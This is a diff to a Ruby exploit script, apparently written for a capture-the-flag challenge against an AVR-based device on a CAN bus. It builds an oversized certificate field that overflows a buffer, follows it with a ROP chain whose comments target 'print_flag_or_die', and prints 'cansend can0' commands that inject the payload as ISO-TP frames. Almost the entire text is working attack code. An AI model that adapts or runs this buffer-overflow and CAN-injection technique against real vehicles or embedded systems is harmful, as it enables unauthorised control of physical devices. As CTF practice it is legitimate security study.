@@ -3,16 +3,24 @@
 def dehex(string)
 	string.split.map{|x| x.to_i(16).chr}.join
 end
-def xx(number)
-	'%02x'%[number]
-end
-def le(number)
-	a = []
+def xhelper(number, minLength)
+	bytes = []
 	while number>0 do
-		a << xx(number % 256)
+		bytes << '%02x'%[number % 256]
 		number /= 256
 	end
-	return a.join ' '
+	if bytes.length < minLength then
+		bytes += ['00'] * (minLength - bytes.length)
+	end
+	return bytes
+end
+def xx(number, minLength=1)
+	bytes = xhelper(number, minLength)
+	return bytes.reverse.join ' '
+end
+def le(number, minLength=1)
+	bytes = xhelper(number, minLength)
+	return bytes.join ' '
 end
 def hex(string)
 	string.each_byte.map{|x| xx(x)}.join(' ')
@@ -26,25 +34,25 @@ $nist =    [0x81, hex('NIST P-192')]
 Abba =    [0x82, 'ab ba 42 c0 ff ee 13 37']
 EccKey =  [0x83, '04 8d ab 11 e2 d3 a7 37 e2 d9 57 57 9f b8 ab dd 03 c8 4f 9b ba a8 9d c6 33 54 03 54 71 5a 80 a8 d0 29 b6 b3 87 f2 ac 2f db 00 ec a3 ce 0d b7 26 7e']
 Unknown = [0x84, 'd9 00 3c ac af 5b 93 5f 9f cb 0f 17 65 b0 cf 9b d7 a2 a2 35 cc 03 a6 fa d6 8d a8 34 fc 8e 21 02']
-Parts = [ Riscar, $nist, Abba, EccKey, Unknown]
+Parts = [Riscar, $nist, Abba, EccKey, Unknown]
 
 
 # Payload
 Padding = (1..90).each.map{|x| xx(x) }.join(' ')
-Locals  = '4a 09 YY 08 9d 3e 3e 95' # four bytes to cross locals, + four more for cert pointer and saved sp and 
+Locals  = '4a 09 YY 08 9d 3e 3e 95' # four bytes to cross locals, + four more for cert pointer and saved sp
 ROP = [
-	'00 79 fb    ', # return to INT0_
-	'21 0a       ', # populate rx24
-	'23 22 21 20 ', # rx22, rx20
-	'13 37       ', # populate rx18
-	'00 00 00 00 ', # RAMP bytes
-	'80 00 01    ', # SREG, r0 r1
-	'00 35 14    ', # return to sub_34e2 to get leet
-	'ca fe ba be ', # pops
-	'00 4e 8f    ', # return to print_flag_or_die_4E8F        
-].join.split.join(' ')
+	xx(0x0079fb,3), # return to INT0_
+	xx(0x210a),     # populate rx24
+	'23 22 21 20',  # rx22, rx20
+	xx(0x1337),     # populate rx18
+	'00 00 00 00',  # RAMP bytes
+	'80 44 00',     # SREG, r0 r1
+	xx(0x003514,3), # return to sub_34e2 to get leet
+	'ca fe ba be',  # pops
+	xx(0x004e8f,3), # return to print_flag_or_die_4E8F
+]
 
-$nist[1] += ' ' + Padding + ' ' + Locals + ' ' + ROP
+$nist[1] = [$nist[1], Padding, Locals, ROP].join(' ')
 
 def makePayload()
 	cert = Magic + ' ' + Parts.map { |part|
@@ -57,13 +65,13 @@ def makePayload()
 	return cert
 end
 
-CERT_ADDR = 0x1040
+CERT_ADDR = 0x0040
 
-def splitIntoWriteMessages(payload, maxMsgLen=50) 
+def splitIntoWriteMessages(payload, maxMsgLen=50)
 	messages = []
 	address = CERT_ADDR
 	payload.split.each_slice(maxMsgLen-5) do |slice|
-		messages << ['3d 21', le(address), xx(slice.length), slice.join(' ')].join(' ')
+		messages << ['3d 12', le(address, 2), xx(slice.length), slice.join(' ')].join(' ')
 		address += slice.length
 	end
 	return messages
@@ -71,7 +79,7 @@ end
 
 def canify(msg)
 	bytes = msg.split
-	first = xx(0x1000 + bytes.length)
+	first = xx(0x1000 + bytes.length).gsub(/ /,'')
 	first += bytes.shift(6).join
 
 	fragments = [first]
@@ -117,9 +125,9 @@ SID = '665'
 	messages.each do |message|
 		frames = canify(message)
 		frames.each do |frame|
-			puts "#{SID}##{xx(frame.length/2)}#{frame}"
+			puts "cansend can0 #{SID}##{frame.scan(/../).join('.')}"
 		end
-		puts
+		puts "sleep 10"
 	end
 	puts
 #end
